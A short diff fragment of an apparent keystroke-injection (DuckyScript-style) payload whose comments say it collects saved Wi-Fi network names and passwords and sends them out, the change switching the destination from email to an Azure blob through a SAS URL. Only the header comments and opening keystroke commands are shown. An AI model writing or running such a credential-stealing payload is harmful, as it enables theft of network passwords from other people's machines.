@@ -1,4 +1,6 @@
-REM The following script will allow us to obtain network names and wifi passwords and export them via email
+REM The following script will allow us to obtain network names and wifi passwords and export them to an Azure blob
+REM Set variables at lines 61 and 65
+REM Ensure SAS url can create and write to the blob
 DELAY 5000
 CONTROL ESCAPE
 DELAY 500
